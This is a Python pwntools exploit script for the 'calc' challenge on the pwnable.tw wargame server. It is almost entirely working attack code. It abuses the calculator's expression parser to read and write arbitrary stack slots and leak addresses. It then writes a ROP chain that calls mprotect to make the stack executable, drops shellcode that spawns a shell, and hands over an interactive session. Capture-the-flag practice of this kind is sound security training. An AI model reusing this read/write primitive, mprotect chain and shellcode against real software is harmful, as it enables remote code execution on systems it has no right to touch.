#!/usr/bin/env python3
import pwn

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('../calc')

# Run this python script inside tmux like this:
# $> tmux
# $> ./solution GDB
# It will spawn a separate window with the GDB session
pwn.context.terminal = ["tmux", "splitw", "-h"]

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break mprotect
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.LOCAL:
        return pwn.process([exe.path] + argv, *a, **kw)
    else:
        return pwn.remote('chall.pwnable.tw', 10100)


io = start()
io.recvuntil("=== Welcome to SECPROG calculator ===\n")


def read_stack_offset(offset):
    assert offset > 0
    io.send(str(offset) + '+00\n')
    signed = int(io.recvuntil('\n'))
    unsigned = signed % 2**32
    return unsigned


def write_stack_offset(offset, value):
    assert offset > 0
    assert value > 0
    io.send(str(offset) + '*' + '00%' + str(value) + '\n')
    io.recvline()

main_ret_address_offset = 361

def get_stack_address_below_main():
    esp_placed_at_offset = 400
    return read_stack_offset(esp_placed_at_offset) - \
           (esp_placed_at_offset + main_ret_address_offset)


def search_for_main():
    for x in range(390, 405):
        value = read_stack_offset(x)
        print("Offset: %d. Value: 0x%08x" % (x, value))
        if value == exe.symbols['main']:
            print("FOUND MAIN AT %d" % x)




main_address = read_stack_offset(main_ret_address_offset)
write_stack_offset(main_ret_address_offset, main_address)
read_stack_offset(main_ret_address_offset)


def write_rop_chain_to_addr(addr, rop_chain):
    assert len(rop_chain) % 4 == 0
    for x in range(0, int(len(rop_chain)/4)):
        val = rop_chain[x*4:(x + 1)*4]
        val = pwn.u32(val)
        write_stack_offset(x + addr, val)

# Idea:


mprotect_addr = exe.symbols['mprotect']

stack_addr = get_stack_address_below_main()
stack_addr_at_pagesize = stack_addr % 4096
rop_chain = (
    pwn.p32(stack_addr_at_pagesize) +
    pwn.p32(4096) +         # page size
    pwn.p32(7)              # rwx
)

rop_chain += (
    pwn.p32(stack_addr - len(rop_chain)) +
    pwn.asm(pwn.shellcraft.sh())
)

write_rop_chain_to_addr(stack_addr+1, rop_chain)
write_stack_offset(main_ret_address_offset, mprotect_addr)
io.interactive()
